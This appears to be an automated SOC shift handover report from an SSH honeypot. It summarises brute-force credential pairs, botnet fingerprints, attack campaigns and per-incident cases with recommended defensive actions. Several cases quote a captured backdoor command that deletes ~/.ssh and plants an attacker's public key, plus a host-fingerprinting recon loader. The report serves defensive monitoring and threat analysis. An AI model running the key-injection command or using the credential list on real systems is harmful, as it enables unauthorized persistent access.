# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-09 |
| **Generated At** | 2026-07-09T20:00:49Z |
| **Shift Time** | 20:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **243** |
| Confirmed Threats | **227** |
| False Positives Filtered | **16** (6.6%) |
| Unique Attacker IPs | **73** |
| Countries of Origin | **24** |
| High Severity Cases | **137** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **106** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **162** |
| Unique Credential Pairs | **116** |
| Unique Usernames | **20** |
| Unique Passwords | **108** |
| Successful Auth Pairs | **148** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 100 |
| `support` | 8 |
| `345gs5662d34` | 8 |
| `guest` | 6 |
| `debian` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 8 |
| `1qaz2wsx` | 5 |
| `5555555` | 4 |
| `eclipse` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 8 |
| `support` | `5555555` | 4 |
| `guest` | `1qaz2wsx` | 4 |
| `eclipse` | `eclipse` | 4 |
| `root` | `testing` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nagios` | `Nagios123` | `185.242.3.195` | 2026-07-09T16:55:35 |
| `support` | `5555555` | `178.178.222.60` | 2026-07-09T16:55:39 |
| `support` | `5555555` | `123.129.245.249` | 2026-07-09T16:55:49 |
| `support` | `5555555` | `10.0.0.73` | 2026-07-09T16:56:05 |
| `root` | `Password01` | `45.198.224.120` | 2026-07-09T16:56:55 |
| `root` | `Abc123++` | `124.6.178.98` | 2026-07-09T16:57:40 |
| `345gs5662d34` | `345gs5662d34` | `124.6.178.98` | 2026-07-09T16:57:44 |
| `root` | `3245gs5662d34` | `124.6.178.98` | 2026-07-09T16:57:46 |
| `root` | `Welcome12#` | `123.25.115.112` | 2026-07-09T16:58:08 |
| `345gs5662d34` | `345gs5662d34` | `123.25.115.112` | 2026-07-09T16:58:12 |
| `root` | `3245gs5662d34` | `123.25.115.112` | 2026-07-09T16:58:14 |
| `user1` | `P@ssw0rd123` | `199.195.254.215` | 2026-07-09T17:00:52 |
| `345gs5662d34` | `345gs5662d34` | `199.195.254.215` | 2026-07-09T17:00:53 |
| `user1` | `3245gs5662d34` | `199.195.254.215` | 2026-07-09T17:00:53 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-09T17:02:43 |
| `user1` | `P@ssw0rd123` | `31.76.78.140` | 2026-07-09T17:02:43 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-09T17:02:45 |
| `345gs5662d34` | `345gs5662d34` | `31.76.78.140` | 2026-07-09T17:02:45 |
| `user1` | `3245gs5662d34` | `31.76.78.140` | 2026-07-09T17:02:46 |
| `nagios` | `Nagios123` | `10.0.0.73` | 2026-07-09T17:02:55 |
| `alice` | `password` | `10.0.0.73` | 2026-07-09T17:04:16 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-09T17:04:20 |
| `alice` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T17:04:22 |
| `root` | `!root` | `91.92.40.12` | 2026-07-09T17:05:54 |
| `ftp-user` | `123` | `159.65.128.12` | 2026-07-09T17:07:00 |
| `345gs5662d34` | `345gs5662d34` | `159.65.128.12` | 2026-07-09T17:07:04 |
| `ftp-user` | `3245gs5662d34` | `159.65.128.12` | 2026-07-09T17:07:06 |
| `root` | `centos` | `45.198.224.120` | 2026-07-09T17:07:09 |
| `root` | `111111` | `91.92.40.12` | 2026-07-09T17:07:50 |
| `root` | `123123` | `91.92.40.12` | 2026-07-09T17:09:38 |
| `root` | `123321` | `91.92.40.12` | 2026-07-09T17:11:22 |
| `root` | `1234` | `91.92.40.12` | 2026-07-09T17:13:03 |
| `root` | `12345` | `91.92.40.12` | 2026-07-09T17:14:45 |
| `guest` | `1qaz2wsx` | `196.188.187.205` | 2026-07-09T17:15:01 |
| `guest` | `1qaz2wsx` | `203.252.10.3` | 2026-07-09T17:15:10 |
| `guest` | `1qaz2wsx` | `10.0.0.73` | 2026-07-09T17:15:24 |
| `unknown` | `unknown66` | `10.0.0.73` | 2026-07-09T17:16:37 |
| `supervisor` | `logon` | `117.70.94.155` | 2026-07-09T17:18:06 |
| `ubuntu` | `git` | `45.198.224.120` | 2026-07-09T17:18:09 |
| `root` | `1234567` | `91.92.40.12` | 2026-07-09T17:18:13 |
| `root` | `12345678` | `91.92.40.12` | 2026-07-09T17:19:45 |
| `eclipse` | `eclipse` | `62.201.253.23` | 2026-07-09T17:20:53 |
| `eclipse` | `eclipse` | `118.163.145.175` | 2026-07-09T17:21:06 |
| `debian` | `admin` | `185.242.3.195` | 2026-07-09T17:21:09 |
| `root` | `123456789` | `91.92.40.12` | 2026-07-09T17:21:22 |
| `supervisor` | `logon` | `10.0.0.73` | 2026-07-09T17:21:47 |
| `root` | `1234567890` | `91.92.40.12` | 2026-07-09T17:23:01 |
| `root` | `123456a` | `91.92.40.12` | 2026-07-09T17:24:42 |
| `eclipse` | `eclipse` | `10.0.0.73` | 2026-07-09T17:24:50 |
| `root` | `1q2w3e4r!` | `5.99.196.202` | 2026-07-09T17:24:56 |
| `345gs5662d34` | `345gs5662d34` | `5.99.196.202` | 2026-07-09T17:24:59 |
| `root` | `3245gs5662d34` | `5.99.196.202` | 2026-07-09T17:25:00 |
| `root` | `123456b` | `91.92.40.12` | 2026-07-09T17:26:24 |
| `root` | `1234abcd` | `91.92.40.12` | 2026-07-09T17:28:08 |
| `root` | `QAZWSXEDC` | `45.198.224.120` | 2026-07-09T17:28:32 |
| `root` | `123abc` | `91.92.40.12` | 2026-07-09T17:29:54 |
| `root` | `123qwe` | `91.92.40.12` | 2026-07-09T17:31:37 |
| `root` | `1q2w3e4r` | `91.92.40.12` | 2026-07-09T17:33:19 |
| `root` | `1qaz2wsx` | `91.92.40.12` | 2026-07-09T17:35:02 |
| `root` | `1qaz@WSX` | `91.92.40.12` | 2026-07-09T17:36:54 |
| `debian` | `admin` | `10.0.0.73` | 2026-07-09T17:37:09 |
| `operator` | `operator77` | `78.187.9.111` | 2026-07-09T17:38:10 |
| `operator` | `operator77` | `220.134.25.203` | 2026-07-09T17:38:19 |
| `root` | `21` | `91.92.40.12` | 2026-07-09T17:38:54 |
| `ubuntu` | `abcde` | `45.198.224.120` | 2026-07-09T17:39:36 |
| `root` | `321` | `91.92.40.12` | 2026-07-09T17:40:36 |
| `debian` | `debian7` | `75.80.65.214` | 2026-07-09T17:40:48 |
| `debian` | `debian7` | `10.0.0.73` | 2026-07-09T17:41:13 |
| `root` | `4321` | `91.92.40.12` | 2026-07-09T17:42:18 |
| `centos` | `centos123456` | `196.189.124.218` | 2026-07-09T17:43:25 |
| `root` | `54321` | `91.92.40.12` | 2026-07-09T17:44:01 |
| `root` | `555555` | `91.92.40.12` | 2026-07-09T17:45:39 |
| `root` | `654321` | `91.92.40.12` | 2026-07-09T17:47:17 |
| `root` | `7777777` | `91.92.40.12` | 2026-07-09T17:48:57 |
| `root` | `Admin2026!` | `91.92.40.12` | 2026-07-09T17:50:35 |
| `root` | `oracol123` | `45.198.224.120` | 2026-07-09T17:50:40 |
| `root` | `P4ssw0rd` | `91.92.40.12` | 2026-07-09T17:52:17 |
| `root` | `P4ssword` | `91.92.40.12` | 2026-07-09T17:54:11 |
| `root` | `Pa22w0rd` | `185.242.3.195` | 2026-07-09T17:54:50 |
| `root` | `P@ssw0rd` | `91.92.40.12` | 2026-07-09T17:56:14 |
| `root` | `P@ssw0rd2026` | `91.92.40.12` | 2026-07-09T17:57:49 |
| `support` | `support` | `176.53.159.196` | 2026-07-09T17:58:44 |
| `root` | `P@ssword` | `91.92.40.12` | 2026-07-09T17:59:20 |
| `support` | `support` | `10.0.0.73` | 2026-07-09T18:00:04 |
| `root` | `Passw0rd` | `91.92.40.12` | 2026-07-09T18:00:51 |
| `root` | `Qq12345678` | `45.198.224.120` | 2026-07-09T18:01:53 |
| `root` | `Password1` | `91.92.40.12` | 2026-07-09T18:02:22 |
| `operator` | `qwerty1` | `203.252.10.3` | 2026-07-09T18:02:47 |
| `root` | `lol123` | `124.88.174.143` | 2026-07-09T18:03:34 |
| `root` | `Root123` | `91.92.40.12` | 2026-07-09T18:04:07 |
| `root` | `abc123` | `91.92.40.12` | 2026-07-09T18:06:03 |
| `operator` | `qwerty1` | `10.0.0.73` | 2026-07-09T18:06:45 |
| `root` | `admin` | `91.92.40.12` | 2026-07-09T18:07:42 |
| `root` | `alpine` | `91.92.40.12` | 2026-07-09T18:09:15 |
| `root` | `testing` | `200.37.179.83` | 2026-07-09T18:09:21 |
| `root` | `changeme` | `91.92.40.12` | 2026-07-09T18:10:43 |
| `root` | `Pa22w0rd` | `10.0.0.73` | 2026-07-09T18:10:52 |
| `root` | `default` | `91.92.40.12` | 2026-07-09T18:12:20 |
| `root` | `testing` | `35.130.111.146` | 2026-07-09T18:12:38 |
| `root` | `testing` | `10.0.0.73` | 2026-07-09T18:13:02 |
| `yangliusha3` | `yangliusha3` | `45.198.224.120` | 2026-07-09T18:13:08 |
| `root` | `letmein` | `91.92.40.12` | 2026-07-09T18:14:01 |
| `root` | `asdfghjkl` | `107.135.117.245` | 2026-07-09T18:14:16 |
| `root` | `asdfghjkl` | `5.48.46.95` | 2026-07-09T18:14:22 |
| `root` | `p4ssword` | `91.92.40.12` | 2026-07-09T18:15:52 |
| `root` | `passw0rd` | `91.92.40.12` | 2026-07-09T18:17:50 |
| `claude` | `1q2w#E$R` | `107.150.103.210` | 2026-07-09T18:18:26 |
| `345gs5662d34` | `345gs5662d34` | `107.150.103.210` | 2026-07-09T18:18:28 |
| `claude` | `3245gs5662d34` | `107.150.103.210` | 2026-07-09T18:18:28 |
| `root` | `password` | `91.92.40.12` | 2026-07-09T18:19:32 |
| `root` | `qwerty` | `91.92.40.12` | 2026-07-09T18:21:03 |
| `root` | `qwerty123456` | `91.92.40.12` | 2026-07-09T18:22:33 |
| `root` | `r00t` | `91.92.40.12` | 2026-07-09T18:24:03 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-09T18:26:52 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-09T18:26:52 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-09T18:26:54 |
| `root` | `root!@#` | `91.92.40.12` | 2026-07-09T18:27:13 |
| `support` | `password@123` | `122.187.227.145` | 2026-07-09T18:28:03 |
| `root` | `Password22` | `185.242.3.195` | 2026-07-09T18:28:40 |
| `root` | `root#123` | `91.92.40.12` | 2026-07-09T18:28:55 |
| `root` | `root0000` | `91.92.40.12` | 2026-07-09T18:30:41 |
| `default` | `letmein` | `122.187.147.13` | 2026-07-09T18:32:24 |
| `root` | `root1111` | `91.92.40.12` | 2026-07-09T18:32:25 |
| `default` | `letmein` | `187.115.144.103` | 2026-07-09T18:32:43 |
| `root` | `Chegg123` | `45.198.224.120` | 2026-07-09T18:33:26 |
| `root` | `root123` | `91.92.40.12` | 2026-07-09T18:34:03 |
| `guest` | `guest33` | `71.12.241.225` | 2026-07-09T18:34:40 |
| `guest` | `guest33` | `85.105.2.51` | 2026-07-09T18:34:52 |
| `config` | `config88` | `223.100.248.64` | 2026-07-09T18:35:32 |
| `root` | `root1234` | `91.92.40.12` | 2026-07-09T18:35:34 |
| `root` | `root123456` | `91.92.40.12` | 2026-07-09T18:37:05 |
| `root` | `root2024` | `91.92.40.12` | 2026-07-09T18:38:37 |
| `config` | `config88` | `101.13.4.128` | 2026-07-09T18:38:54 |
| `config` | `config88` | `49.124.149.53` | 2026-07-09T18:39:04 |
| `root` | `root2025` | `91.92.40.12` | 2026-07-09T18:40:04 |
| `root` | `root2026` | `91.92.40.12` | 2026-07-09T18:41:28 |
| `root` | `root2222` | `91.92.40.12` | 2026-07-09T18:42:51 |
| `root` | `root4444` | `91.92.40.12` | 2026-07-09T18:44:11 |
| `root` | `Password22` | `10.0.0.73` | 2026-07-09T18:44:44 |
| `duzon` | `duzon@1234` | `45.198.224.120` | 2026-07-09T18:44:54 |
| `root` | `root5555` | `91.92.40.12` | 2026-07-09T18:45:33 |
| `root` | `---fuck_you----` | `115.175.140.17` | 2026-07-09T18:46:17 |
| `root` | `root6666` | `91.92.40.12` | 2026-07-09T18:46:58 |
| `root` | `root9999` | `91.92.40.12` | 2026-07-09T18:48:23 |
| `root` | `root@123` | `91.92.40.12` | 2026-07-09T18:49:48 |
| `root` | `rootaccess` | `91.92.40.12` | 2026-07-09T18:51:12 |
| `root` | `rootadmin` | `91.92.40.12` | 2026-07-09T18:52:38 |
| `root` | `rootme` | `91.92.40.12` | 2026-07-09T18:54:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **243** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 89 |
| libssh | 31 |
| OpenSSH | 25 |
| Paramiko (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 67 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 25 | 24 |
| `f555226df196...` | Mirai/variant | 21 | 7 |
| `16443846184e...` | Generic scanner | 18 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 67 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 25 | 24 | Mirai/variant |
| `f555226df196...` | libssh | 21 | 7 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 18 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 65 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.12`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `123.25.115.112`, `31.76.78.140`, `199.195.254.215`, `5.99.196.202`, `159.65.128.12`, `107.150.103.210`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **73** |
| Unique ASNs | **51** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (136)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a5e9092969f7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 16:55 |
| **Last Seen** | 2026-07-09 16:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:55:31` | `cowrie.session.connect` |
| `2026-07-09 16:55:32` | `cowrie.client.version` |
| `2026-07-09 16:55:32` | `cowrie.client.kex` |
| `2026-07-09 16:55:35` | `cowrie.login.success` |
| `2026-07-09 16:55:38` | `cowrie.session.params` |
| `2026-07-09 16:55:38` | `cowrie.command.input` |
| `2026-07-09 16:55:38` | `cowrie.log.closed` |
| `2026-07-09 16:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d48c2f5b5b0

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-09 16:55 |
| **Last Seen** | 2026-07-09 16:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:55:38` | `cowrie.session.connect` |
| `2026-07-09 16:55:38` | `cowrie.client.version` |
| `2026-07-09 16:55:38` | `cowrie.client.kex` |
| `2026-07-09 16:55:39` | `cowrie.login.success` |
| `2026-07-09 16:55:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 16:55:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f3a2cc925d

| Field | Detail |
|---|---|
| **Source IP** | `123.129.245[.]249` |
| **First Seen** | 2026-07-09 16:55 |
| **Last Seen** | 2026-07-09 16:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:55:46` | `cowrie.session.connect` |
| `2026-07-09 16:55:47` | `cowrie.client.version` |
| `2026-07-09 16:55:47` | `cowrie.client.kex` |
| `2026-07-09 16:55:49` | `cowrie.login.success` |
| `2026-07-09 16:55:50` | `cowrie.direct-tcpip.request` |
| `2026-07-09 16:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.129.245[.]249` to AbuseIPDB if not already reported
- [ ] Block `123.129.245[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd894ebc48fa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 16:56 |
| **Last Seen** | 2026-07-09 16:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:56:47` | `cowrie.session.connect` |
| `2026-07-09 16:56:49` | `cowrie.client.version` |
| `2026-07-09 16:56:49` | `cowrie.client.kex` |
| `2026-07-09 16:56:55` | `cowrie.login.success` |
| `2026-07-09 16:56:58` | `cowrie.session.params` |
| `2026-07-09 16:56:58` | `cowrie.command.input` |
| `2026-07-09 16:56:59` | `cowrie.log.closed` |
| `2026-07-09 16:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c0f144915b

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-09 16:57 |
| **Last Seen** | 2026-07-09 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:57:39` | `cowrie.session.connect` |
| `2026-07-09 16:57:39` | `cowrie.client.version` |
| `2026-07-09 16:57:39` | `cowrie.client.kex` |
| `2026-07-09 16:57:40` | `cowrie.login.success` |
| `2026-07-09 16:57:41` | `cowrie.session.params` |
| `2026-07-09 16:57:41` | `cowrie.command.input` |
| `2026-07-09 16:57:41` | `cowrie.command.failed` |
| `2026-07-09 16:57:41` | `cowrie.log.closed` |
| `2026-07-09 16:57:42` | `cowrie.session.params` |
| `2026-07-09 16:57:42` | `cowrie.command.input` |
| `2026-07-09 16:57:42` | `cowrie.session.file_download` |
| `2026-07-09 16:57:42` | `cowrie.log.closed` |
| `2026-07-09 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6014bb08c56a

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-09 16:57 |
| **Last Seen** | 2026-07-09 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:57:43` | `cowrie.session.connect` |
| `2026-07-09 16:57:43` | `cowrie.client.version` |
| `2026-07-09 16:57:43` | `cowrie.client.kex` |
| `2026-07-09 16:57:44` | `cowrie.login.success` |
| `2026-07-09 16:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad1f19d8a90

| Field | Detail |
|---|---|
| **Source IP** | `124.6.178[.]98` |
| **First Seen** | 2026-07-09 16:57 |
| **Last Seen** | 2026-07-09 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:57:44` | `cowrie.session.connect` |
| `2026-07-09 16:57:44` | `cowrie.client.version` |
| `2026-07-09 16:57:45` | `cowrie.client.kex` |
| `2026-07-09 16:57:46` | `cowrie.login.success` |
| `2026-07-09 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.6.178[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.6.178[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d057fe500672

| Field | Detail |
|---|---|
| **Source IP** | `123.25.115[.]112` |
| **First Seen** | 2026-07-09 16:58 |
| **Last Seen** | 2026-07-09 16:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 16:58:07` | `cowrie.session.connect` |
| `2026-07-09 16:58:07` | `cowrie.client.version` |
| `2026-07-09 16:58:07` | `cowrie.client.kex` |
| `2026-07-09 16:58:08` | `cowrie.login.success` |
| `2026-07-09 16:58:09` | `cowrie.session.params` |
| `2026-07-09 16:58:09` | `cowrie.command.input` |
| `2026-07-09 16:58:09` | `cowrie.command.failed` |
| `2026-07-09 16:58:09` | `cowrie.log.closed` |
| `2026-07-09 16:58:10` | `cowrie.session.params` |
| `2026-07-09 16:58:10` | `cowrie.command.input` |
| `2026-07-09 16:58:10` | `cowrie.session.file_download` |
| `2026-07-09 16:58:10` | `cowrie.log.closed` |
| `2026-07-09 16:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.25.115[.]112` to AbuseIPDB if not already reported
- [ ] Block `123.25.115[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

